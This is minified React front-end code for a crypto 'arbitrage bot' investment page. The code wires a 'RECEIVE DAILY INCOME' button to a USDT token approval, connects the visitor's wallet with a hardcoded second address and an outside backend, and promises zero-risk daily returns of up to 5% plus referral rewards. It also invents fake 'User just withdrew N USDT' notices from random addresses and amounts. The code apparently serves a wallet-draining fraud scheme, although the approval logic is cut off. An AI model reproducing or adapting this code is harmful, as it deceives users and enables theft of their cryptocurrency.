                                    children: (0, uy.jsx)("div", {
                                        className: "van-field__body",
                                        children: (0, uy.jsx)("input", {
                                            type: "text",
                                            name: "transfer_amount",
                                            placeholder: "Please enter the transfer amount",
                                            className: "van-field__control"
                                        })
                                    })
                                })
                            })]
                        }), (0, uy.jsx)("button", {
                            className: "van-button van-button--info van-button--normal van-button--round",
                            style: {
                                background: "rgb(0, 159, 212)",
                                borderRadius: "15px",
                                width: "45%",
                                marginTop: "10px"
                            },
                            children: (0, uy.jsx)("span", {
                                className: "van-button__text",
                                children: "Transfer"
                            })
                        })]
                    }), (0, uy.jsx)("i", {
                        onClick: t,
                        role: "button",
                        tabIndex: "0",
                        className: "van-icon van-icon-close van-popup__close-icon van-popup__close-icon--top-right"
                    })]
                })
            },
            Oy = e => {
                let {
                    onClose: t,
                    withdraw: n,
                    roi: r,
                    account: i,
                    notify: o,
                    withdrawalCount: a
                } = e;
                const [c, l] = (0, s.useState)(0);
                return (0, uy.jsxs)("div", {
                    className: "van-popup van-popup--round van-popup--center",
                    style: {
                        background: "linear-gradient(0deg, rgb(47, 52, 98), rgb(47, 52, 98)), linear-gradient(0deg, rgb(194, 194, 194), rgb(194, 194, 194))",
                        textAlign: "center",
                        height: "320px",
                        width: "85%",
                        zIndex: "2035"
                    },
                    children: [(0, uy.jsxs)("div", {
                        className: "articlePopup",
                        children: [(0, uy.jsx)("div", {
                            className: "popTitle mt20",
                            children: "Withdraw"
                        }), (0, uy.jsx)("div", {
                            className: "line_cancel"
                        }), (0, uy.jsxs)("div", {
                            className: "invite income pt10",
                            style: {
                                height: "100px"
                            },
                            children: [(0, uy.jsxs)("div", {
                                style: {
                                    display: "flex",
                                    justifyContent: "space-between"
                                },
                                children: [(0, uy.jsxs)("div", {
                                    className: "contract ml20",
                                    style: {
                                        float: "left"
                                    },
                                    children: ["Withdrawable: ", r]
                                }), (0, uy.jsxs)("div", {
                                    className: "contract ml20",
                                    style: {
                                        float: "left"
                                    },
                                    children: ["Daily Withdrawal: ", a]
                                }), (0, uy.jsx)("button", {
                                    className: "max rounded-3xl",
                                    style: {
                                        width: "50px",
                                        float: "right",
                                        fontSize: "12px"
                                    },
                                    onClick: () => l(r),
                                    children: "Maximum"
                                })]
                            }), (0, uy.jsx)("div", {
                                className: "vanf2 van-cell van-cell--center van-field",
                                children: (0, uy.jsx)("div", {
                                    className: "van-cell__value van-cell__value--alone van-field__value",
                                    children: (0, uy.jsx)("div", {
                                        className: "van-field__body",
                                        children: (0, uy.jsx)("input", {
                                            type: "text",
                                            name: "transfer_amount",
                                            placeholder: "Please enter the withdrawal amount",
                                            className: "van-field__control",
                                            value: c,
                                            onChange: e => l(e.target.value)
                                        })
                                    })
                                })
                            })]
                        }), (0, uy.jsx)("button", {
                            className: "van-button van-button--info van-button--normal van-button--round",
                            style: {
                                background: "rgb(0, 159, 212)",
                                borderRadius: "15px",
                                width: "45%",
                                marginTop: "10px"
                            },
                            onClick: e => {
                                e.preventDefault(), c > r ? o("Amount exceeded") : n(i, c)
                            },
                            children: (0, uy.jsx)("span", {
                                className: "van-button__text",
                                children: "Withdraw"
                            })
                        })]
                    }), (0, uy.jsx)("div", {
                        className: "van-popup__close-icon van-popup__close-icon--top-right",
                        style: {
                            background: "#fff"
                        },
                        children: (0, uy.jsx)("img", {
                            src: "/_nuxt/img/close-x.svg",
                            alt: "close",
                            width: "20px",
                            height: "20px",
                            onClick: t,
                            role: "button",
                            tabIndex: "0"
                        })
                    })]
                })
            },
            Ry = {
                position: "relative",
                padding: "5px",
                backgroundColor: "#000",
                color: "#fff",
                borderRadius: "5px",
                zIndex: 1e3
            },
            My = () => {
                const [e, t] = (0, s.useState)({
                    visible: !1,
                    message: ""
                });
                (0, s.useEffect)((() => {
                    const e = () => {
                        const e = n(),
                            i = r(10, 5e3),
                            o = "User: ".concat(e, " just withdrew ").concat(i, "USDT");
                        t({
                            visible: !0,
                            message: o
                        }), setTimeout((() => {
                            t({
                                visible: !1,
                                message: ""
                            })
                        }), 2e3)
                    };
                    e();
                    const i = setInterval(e, 3e3);
                    return () => clearInterval(i)
                }), []);
                const n = () => {
                        let e = "0x";
                        for (let t = 0; t < 40; t++) e += "0123456789abcdef" [Math.floor(16 * Math.random())];
                        return "".concat(e.slice(0, 6), "****").concat(e.slice(-4))
                    },
                    r = (e, t) => (Math.random() * (t - e) + e).toFixed(2);
                return (0, uy.jsx)("div", {
                    style: {
                        height: "10px"
                    },
                    children: e.visible && (0, uy.jsx)("div", {
                        style: Ry,
                        children: e.message
                    })
                })
            },
            jy = e => {
                let {
                    shortAccount: t,
                    isWalletConnected: n,
                    usdtBalance: r,
                    approve: i,
                    roi: o,
                    start: a,
                    withdraw: c,
                    notify: l,
                    robotID: u,
                    totalPool: d,
                    totalTransactions: f,
                    totalAddresses: h,
                    withdrawalCount: p
                } = e;
                const [m, g] = (0, s.useState)(null), v = () => {
                    g(null)
                };
                return (0, uy.jsxs)("div", {
                    className: "mt10",
                    style: {
                        width: "100%"
                    },
                    children: [(0, uy.jsxs)("div", {
                        className: "invite",
                        style: {
                            height: "170px"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "Frsb ml10 mr10",
                            children: (0, uy.jsxs)("div", {
                                className: "mt20 ml10",
                                style: {
                                    textAlign: "left"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "assets1",
                                    style: {
                                        float: "left"
                                    },
                                    children: "MY ACCOUNT"
                                }), (0, uy.jsx)("div", {
                                    className: "assets walletAdd",
                                    style: {
                                        float: "right",
                                        marginLeft: "10px"
                                    },
                                    children: n ? "".concat(t) : "No Account"
                                })]
                            })
                        }), (0, uy.jsxs)("div", {
                            className: "Frsb mt20 ml10 walCon",
                            children: [(0, uy.jsxs)("div", {
                                className: "ml10 mobWal",
                                style: {
                                    textAlign: "left",
                                    flex: "2 1 0%"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "assets walAss",
                                    style: {
                                        fontSize: "14px"
                                    },
                                    children: "WALLET BALANCE"
                                }), (0, uy.jsxs)("div", {
                                    className: "assets mt10",
                                    children: ["$", r || "0", " USDT"]
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "mobWal",
                                style: {
                                    textAlign: "left",
                                    flex: "2 1 0%"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "assets walAss",
                                    style: {
                                        fontSize: "14px"
                                    },
                                    children: "PROFIT"
                                }), (0, uy.jsxs)("div", {
                                    className: "assets mt10",
                                    children: ["$", o || "0.0", " USDT"]
                                })]
                            }), (0, uy.jsx)("div", {
                                children: (0, uy.jsx)("div", {
                                    className: "but ml20",
                                    onClick: () => {
                                        g("Withdraw")
                                    },
                                    children: "WITHDRAW"
                                })
                            })]
                        })]
                    }), (0, uy.jsx)(My, {}), (0, uy.jsx)("div", {
                        className: "Fr mt20 mg60",
                        children: (0, uy.jsx)("div", {
                            className: "orderBtn ml10 active",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            children: "Arbitrage bot"
                        })
                    }), (0, uy.jsx)("div", {
                        className: "mt10",
                        style: {
                            width: "100%"
                        },
                        children: (0, uy.jsxs)("div", {
                            className: "invite",
                            style: {
                                height: "380px"
                            },
                            children: [(0, uy.jsx)("div", {
                                className: "Frsb ml20 mr20",
                                children: (0, uy.jsx)("div", {
                                    className: "mt10",
                                    style: {
                                        textAlign: "center",
                                        width: "100%"
                                    },
                                    children: (0, uy.jsx)("img", {
                                        src: "/_nuxt/img/fan1.bafcf6d.png",
                                        alt: "-sm",
                                        className: "token-info-icon spiner",
                                        style: {
                                            margin: "auto"
                                        }
                                    })
                                })
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb ml20 mr20",
                                children: [(0, uy.jsx)("div", {
                                    className: "assets mt10",
                                    children: "OVERVIEW"
                                }), (0, uy.jsx)("div", {
                                    className: "Fr2 time mt10",
                                    children: (0, uy.jsx)("div", {
                                        className: "assets_color active",
                                        children: "24H"
                                    })
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb ml20 mr20 mt10",
                                children: [(0, uy.jsx)("div", {
                                    className: "which",
                                    children: "Number of Addresses"
                                }), (0, uy.jsx)("div", {
                                    className: "assets",
                                    children: h
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb ml20 mr20 mt10",
                                children: [(0, uy.jsx)("div", {
                                    className: "which",
                                    children: "My Robot ID"
                                }), (0, uy.jsx)("div", {
                                    className: "day",
                                    children: u
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb ml20 mr20 mt10",
                                children: [(0, uy.jsx)("div", {
                                    className: "which",
                                    children: "Income"
                                }), (0, uy.jsx)("div", {
                                    className: "day",
                                    children: f
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb ml20 mr20 mt10",
                                children: [(0, uy.jsx)("div", {
                                    className: "which",
                                    children: "Minimum Threshold Amount"
                                }), (0, uy.jsx)("div", {
                                    className: "day",
                                    children: "10 USDT"
                                })]
                            }), (0, uy.jsx)("div", {
                                className: "line_dash"
                            }), (0, uy.jsxs)("div", {
                                className: "Frsb mt20 ml10 mr20",
                                children: [(0, uy.jsxs)("div", {
                                    className: "ml10",
                                    style: {
                                        textAlign: "left"
                                    },
                                    children: [(0, uy.jsx)("div", {
                                        className: "which",
                                        children: "TOTAL CAPITAL POOL (USDT)"
                                    }), (0, uy.jsx)("div", {
                                        className: "assets mt10",
                                        style: {
                                            fontWeight: "400"
                                        },
                                        children: d
                                    })]
                                }), (0, uy.jsxs)("div", {
                                    style: {
                                        textAlign: "right"
                                    },
                                    children: [(0, uy.jsx)("div", {
                                        className: "which",
                                        style: {
                                            textAlign: "right"
                                        },
                                        children: "ANALYSIS POOL (USDT)"
                                    }), (0, uy.jsx)("div", {
                                        className: "assets mt10",
                                        style: {
                                            fontWeight: "400",
                                            textAlign: "right"
                                        },
                                        children: a ? r : "0.0000"
                                    })]
                                })]
                            }), (0, uy.jsx)("div", {
                                className: "Fr mt30",
                                style: {
                                    margin: "30px auto 0px"
                                },
                                children: a ? (0, uy.jsx)("div", {
                                    className: "but but2 ml20",
                                    style: {
                                        marginRight: "30px"
                                    },
                                    children: "RUNNING"
                                }) : (0, uy.jsx)("div", {
                                    className: "but but2 ml20",
                                    style: {
                                        marginRight: "30px"
                                    },
                                    onClick: i,
                                    children: "RECEIVE DAILY INCOME"
                                })
                            })]
                        })
                    }), "Transfer" === m && (0, uy.jsx)(Ny, {
                        onClose: v
                    }), "Withdraw" === m && (0, uy.jsx)(Oy, {
                        withdraw: c,
                        roi: o,
                        notify: l,
                        onClose: v,
                        withdrawalCount: p
                    })]
                })
            };
        var Fy = n(476);
        const Ly = () => (0, uy.jsxs)("div", {
                className: "mt10",
                style: {
                    width: "100%"
                },
                children: [(0, uy.jsxs)("div", {
                    className: "invite income",
                    style: {
                        height: "350px"
                    },
                    children: [(0, uy.jsx)("div", {
                        className: "inviteMoney ml40 mt20",
                        style: {
                            textAlign: "left"
                        },
                        children: "PROGRAM FEATURES"
                    }), (0, uy.jsxs)("div", {
                        className: "Frl mt15",
                        children: [(0, uy.jsx)("img", {
                            src: "/_nuxt/img/1.7ab19e6.svg",
                            className: "ml20",
                            alt: "icon"
                        }), (0, uy.jsxs)("div", {
                            children: [(0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    fontWeight: "700",
                                    paddingTop: "0px",
                                    fontSize: "16px",
                                    textAlign: "left"
                                },
                                children: "Safe and reliable"
                            }), (0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    paddingTop: "10px",
                                    textAlign: "left",
                                    fontWeight: "400"
                                },
                                children: "No need to transfer currency, USDT is deposited in your wallet with zero risk."
                            })]
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frl mt15",
                        children: [(0, uy.jsx)("img", {
                            src: "/_nuxt/img/2.a07f37a.svg",
                            className: "ml20",
                            alt: "icon"
                        }), (0, uy.jsxs)("div", {
                            children: [(0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    fontWeight: "700",
                                    paddingTop: "0px",
                                    fontSize: "16px",
                                    textAlign: "left"
                                },
                                children: "Professional stability"
                            }), (0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    paddingTop: "10px",
                                    textAlign: "left",
                                    fontWeight: "400"
                                },
                                children: "Professional team, stable operation throughout the year."
                            })]
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frl mt15",
                        children: [(0, uy.jsx)("img", {
                            src: "/_nuxt/img/3.3a9f139.svg",
                            className: "ml20",
                            alt: "icon"
                        }), (0, uy.jsxs)("div", {
                            children: [(0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    fontWeight: "700",
                                    paddingTop: "0px",
                                    fontSize: "16px",
                                    textAlign: "left"
                                },
                                children: "Low barrier to entry"
                            }), (0, uy.jsx)("div", {
                                className: "inviteReward ml10",
                                style: {
                                    paddingTop: "10px",
                                    textAlign: "left",
                                    fontWeight: "400"
                                },
                                children: "Share arbitrage income."
                            })]
                        })]
                    })]
                }), (0, uy.jsxs)("div", {
                    className: "invite",
                    style: {
                        height: "auto",
                        marginTop: "20px",
                        padding: "15px 0px"
                    },
                    children: [(0, uy.jsx)("div", {
                        className: "inviteMoney ml40",
                        style: {
                            textAlign: "left"
                        },
                        children: "Grading income"
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv1"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "10-100"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "1.2%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv2"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "101-500"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "1.5%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv3"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "501-1000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "2.0%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv4"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "1001-2000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "2.2%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv5"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "2001-5000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "2.4%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv6"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "5001-10000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "2.6%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv7"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "10001-50000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "3.0%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv8"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "50001-100000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "3.5%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv9"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "100001-500000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "4.0%"
                        })]
                    }), (0, uy.jsxs)("div", {
                        className: "Frsb",
                        style: {
                            width: "100%"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward ml20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "left"
                            },
                            children: "Lv10"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward",
                            style: {
                                flex: "3 1 0%"
                            },
                            children: "500001-1000000"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward mr20",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "right"
                            },
                            children: "5.0%"
                        })]
                    })]
                })]
            }),
            Dy = e => {
                let {
                    CopyToClipboard: t,
                    handleCopy: n,
                    referrerCode: r
                } = e;
                return (0, uy.jsxs)(uy.Fragment, {
                    children: [(0, uy.jsxs)("div", {
                        className: "invite rules",
                        children: [(0, uy.jsx)("div", {
                            className: "inviteMoney",
                            children: "Invite friends to share arbitrage income"
                        }), (0, uy.jsx)("div", {
                            className: "inviteReward pt15",
                            style: {
                                fontSize: "14px",
                                fontWeight: "400"
                            },
                            children: "Join with your friends"
                        }), (0, uy.jsx)("div", {
                            className: "bg2 pt20 mt20",
                            style: {
                                backgroundImage: "url(/_nuxt/img/group.19764a0.svg)"
                            },
                            children: (0, uy.jsx)(t, {
                                text: "".concat(r),
                                onCopy: n,
                                children: (0, uy.jsx)("div", {
                                    className: "now copy1",
                                    children: "Invite now"
                                })
                            })
                        })]
                    }), (0, uy.jsx)("div", {
                        className: "Fr mt20",
                        children: (0, uy.jsx)("div", {
                            className: "orderBtn ml10 active",
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            children: "HOW IT WORKS"
                        })
                    }), (0, uy.jsx)("div", {
                        className: "mt10",
                        style: {
                            width: "100%"
                        },
                        children: (0, uy.jsx)("div", {
                            className: "invite",
                            children: (0, uy.jsx)("div", {
                                className: "Frsa",
                                style: {
                                    width: "100%",
                                    textAlign: "left"
                                },
                                children: (0, uy.jsxs)("div", {
                                    className: "rules",
                                    children: [(0, uy.jsx)("p", {
                                        className: "text-xs font-medium mt-4 leading-5",
                                        children: "1. Invite and refer your friends to join you will get up to two tiers of rewards."
                                    }), (0, uy.jsx)("p", {
                                        className: "text-xs font-medium mt-4 leading-5",
                                        children: "2. The three-tier reward is Level 1 (0.15%) Level 2 (0.08%)"
                                    }), (0, uy.jsx)("p", {
                                        className: "text-xs font-medium mt-4 leading-5",
                                        children: "3. Daily rewards will be calculated based on your subordinate's daily mining output."
                                    }), (0, uy.jsx)("p", {
                                        className: "text-xs font-medium mt-4 leading-5",
                                        children: "Example"
                                    }), (0, uy.jsx)("p", {
                                        className: "text-xs font-medium mt-4 leading-5",
                                        children: "Share your exclusive promotion link through various social software. Friends join the node through your exclusive link, and you will get friend income (0.15%). Your friend invites his friend to join the node, you can get his friend's income (0.8%)."
                                    })]
                                })
                            })
                        })
                    })]
                })
            },
            Hy = e => {
                let {
                    referrerCode: t
                } = e;
                const [n, r] = (0, s.useState)("Rule"), [i, o] = (0, s.useState)(!1), a = () => {
                    o(!0), setTimeout((() => o(!1)), 2e3)
                };
                return (0, uy.jsxs)("div", {
                    className: "mt10",
                    style: {
                        width: "100%"
                    },
                    children: [(0, uy.jsxs)("div", {
                        className: "invite",
                        style: {
                            padding: "15px 0px"
                        },
                        children: [(0, uy.jsx)("div", {
                            className: "inviteReward",
                            children: "MY INVITATION BONUS"
                        }), (0, uy.jsx)("div", {
                            className: "inviteMoney",
                            children: "$ 0.000000"
                        }), (0, uy.jsx)("div", {
                            className: "van-cell van-cell--center van-field",
                            children: (0, uy.jsx)("div", {
                                className: "van-cell__value van-cell__value--alone van-field__value",
                                children: (0, uy.jsxs)("div", {
                                    className: "van-field__body",
                                    children: [(0, uy.jsx)("input", {
                                        type: "text",
                                        readOnly: !0,
                                        placeholder: "Invitation Link:".concat(t),
                                        className: "van-field__control"
                                    }), (0, uy.jsxs)("div", {
                                        className: "van-field__button",
                                        children: [(0, uy.jsx)(Fy.CopyToClipboard, {
                                            text: "".concat(t),
                                            onCopy: a,
                                            children: (0, uy.jsx)("button", {
                                                className: "copy1 van-button van-button--primary van-button--small",
                                                style: {
                                                    background: "rgb(51, 51, 51)",
                                                    color: "rgb(0, 159, 212)",
                                                    border: "0px"
                                                },
                                                children: (0, uy.jsx)("span", {
                                                    className: "van-button__text",
                                                    children: "Copy"
                                                })
                                            })
                                        }), i && (0, uy.jsx)("span", {
                                            style: {
                                                color: "green"
                                            },
                                            children: "Copied!"
                                        })]
                                    })]
                                })
                            })
                        })]
                    }), (0, uy.jsx)("div", {
                        className: "Fr mt20",
                        children: (0, uy.jsx)("div", {
                            className: "orderBtn ml10 ".concat("Rule" === n ? "active" : ""),
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            onClick: () => {
                                r("Rule")
                            },
                            children: "Rules"
                        })
                    }), (0, uy.jsx)(Dy, {
                        handleCopy: a,
                        CopyToClipboard: Fy.CopyToClipboard,
                        referrerCode: t
                    })]
                })
            },
            Uy = e => {
                let {
                    totalEarnings: t,
                    totalIncomes: n,
                    totalWithdrawals: r
                } = e;
                return (0, uy.jsxs)("div", {
                    className: "mt10",
                    style: {
                        width: "100%"
                    },
                    children: [(0, uy.jsx)("div", {
                        className: "invite",
                        style: {
                            height: "150px"
                        },
                        children: (0, uy.jsxs)("div", {
                            className: "Frl",
                            children: [(0, uy.jsxs)("div", {
                                className: "ml30",
                                style: {
                                    flex: "1 1 0%"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "inviteReward",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "12px"
                                    },
                                    children: "USDT"
                                }), (0, uy.jsxs)("div", {
                                    className: "inviteMoney",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "16px"
                                    },
                                    children: ["$ ", (0, uy.jsx)("span", {
                                        children: t || "0"
                                    })]
                                }), (0, uy.jsx)("div", {
                                    className: "total mt25",
                                    style: {
                                        textAlign: "center"
                                    },
                                    children: "TOTAL PROFIT"
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "ml30",
                                style: {
                                    flex: "1 1 0%"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "inviteReward",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "12px"
                                    },
                                    children: "USDT"
                                }), (0, uy.jsxs)("div", {
                                    className: "inviteMoney",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "16px"
                                    },
                                    children: ["$ ", (0, uy.jsx)("span", {
                                        children: n || "0"
                                    })]
                                }), (0, uy.jsx)("div", {
                                    className: "total mt25",
                                    style: {
                                        textAlign: "center"
                                    },
                                    children: "TOTAL BONUS"
                                })]
                            }), (0, uy.jsxs)("div", {
                                className: "ml30",
                                style: {
                                    flex: "1 1 0%"
                                },
                                children: [(0, uy.jsx)("div", {
                                    className: "inviteReward",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "12px"
                                    },
                                    children: "USDT"
                                }), (0, uy.jsxs)("div", {
                                    className: "inviteMoney",
                                    style: {
                                        textAlign: "center",
                                        fontSize: "16px"
                                    },
                                    children: ["$ ", (0, uy.jsx)("span", {
                                        children: r || "0"
                                    })]
                                }), (0, uy.jsx)("div", {
                                    className: "total mt25",
                                    style: {
                                        textAlign: "center"
                                    },
                                    children: "WITHDRAWALS"
                                })]
                            })]
                        })
                    }), (0, uy.jsx)(Ly, {})]
                })
            },
            zy = e => {
                let {
                    shortAccount: t,
                    isWalletConnected: n,
                    usdtBalance: r,
                    approve: i,
                    roi: o,
                    referrerCode: a,
                    earnings: c,
                    withdrawals: l,
                    incomes: u,
                    start: d,
                    totalIncomes: f,
                    totalEarnings: h,
                    totalWithdrawals: p,
                    ToastContainer: m,
                    withdraw: g,
                    notify: v,
                    robotID: y,
                    totalPool: b,
                    totalTransactions: w,
                    totalAddresses: x,
                    withdrawalCount: A
                } = e;
                const [k, E] = (0, s.useState)("Robot"), S = e => {
                    E(e)
                };
                return (0, uy.jsxs)("div", {
                    id: "app",
                    className: "contain",
                    style: {
                        marginBottom: "50px"
                    },
                    children: [(0, uy.jsx)(m, {
                        theme: "dark"
                    }), (0, uy.jsxs)("div", {
                        className: "Fr pt20",
                        children: [(0, uy.jsx)("div", {
                            className: "orderBtn ml10 ".concat("Robot" === k ? "active" : ""),
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            onClick: () => S("Robot"),
                            children: "ROBOT"
                        }), (0, uy.jsx)("div", {
                            className: "orderBtn ml10 ".concat("Invite" === k ? "active" : ""),
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            onClick: () => S("Invite"),
                            children: "INVITE FRIENDS"
                        }), (0, uy.jsx)("div", {
                            className: "orderBtn ml10 ".concat("Friend" === k ? "active" : ""),
                            style: {
                                flex: "1 1 0%",
                                textAlign: "center"
                            },
                            onClick: () => S("Friend"),
                            children: "EARNINGS"
                        })]
                    }), "Robot" === k && (0, uy.jsx)(jy, {
                        shortAccount: t,
                        isWalletConnected: n,
                        usdtBalance: r,
                        roi: o,
                        approve: i,
                        totalEarnings: h,
                        totalIncomes: f,
                        totalWithdrawals: p,
                        start: d,
                        withdraw: g,
                        notify: v,
                        robotID: y,
                        totalAddresses: x,
                        totalTransactions: w,
                        totalPool: b,
                        withdrawalCount: A
                    }), "Invite" === k && (0, uy.jsx)(Hy, {
                        referrerCode: a
                    }), "Friend" === k && (0, uy.jsx)(Uy, {
                        totalEarnings: h,
                        totalIncomes: f,
                        totalWithdrawals: p
                    }), (0, uy.jsx)("div", {
                        style: {
                            marginTop: "20px"
                        }
                    })]
                })
            },
            Gy = () => {
                const [e, t] = (0, s.useState)(!1), [n, r] = (0, s.useState)(null), [i, o] = (0, s.useState)(!1), a = "0xdac17f958d2ee523a2206206994597c13d831ec7", c = ly, [l, u] = (0, s.useState)(!1), [d, f] = (0, s.useState)(""), [h, p] = (0, s.useState)(null), [m, g] = (0, s.useState)(0), [v, y] = (0, s.useState)(null), [b, w] = (0, s.useState)(null), [x, A] = (0, s.useState)(null), [k, E] = (0, s.useState)(null), [S, C] = (0, s.useState)(null), [_, I] = (0, s.useState)(""), [P, T] = (0, s.useState)(0), [B, N] = (0, s.useState)(0), [O, R] = (0, s.useState)(""), [M, j] = (0, s.useState)(""), [F, L] = (0, s.useState)(""), [D, H] = (0, s.useState)(""), [U, z] = (0, s.useState)(""), [G, q] = (0, s.useState)(""), [Q, W] = (0, s.useState)(!1), [V, Z] = (0, s.useState)(!0), [K, J] = (0, s.useState)(null), Y = "https://m12.interestdata.net/", X = "0x52fa9c7a8ea9c3a865c22ac919d57fcfe41a9e32", $ = new cy("https://mainnet.infura.io/v3/fe194f14cc584993ad3ee0d3502a040e"), ee = e => Ue(e), te = e => {
                    if (e.length <= 10) return e;
                    const t = e.slice(0, 7),
                        n = e.slice(-7);
                    return "".concat(t, "***").concat(n)
                }, ne = async () => {
                    const e = new URLSearchParams(window.location.search).get("referralcode");
                    if (e && R(e), window.ethereum) try {
                        const e = (await window.ethereum.request({
                            method: "eth_requestAccounts"
                        }))[0];
                        f(e), I(te(e)), u(!0);
                        const t = new(new cy(window.ethereum).eth.Contract)(c, a);
                        J(t);
                        const n = await re(e);
                        ie(e, n, O, X), oe(e), ae(e), ce(e)
                    } catch (t) {
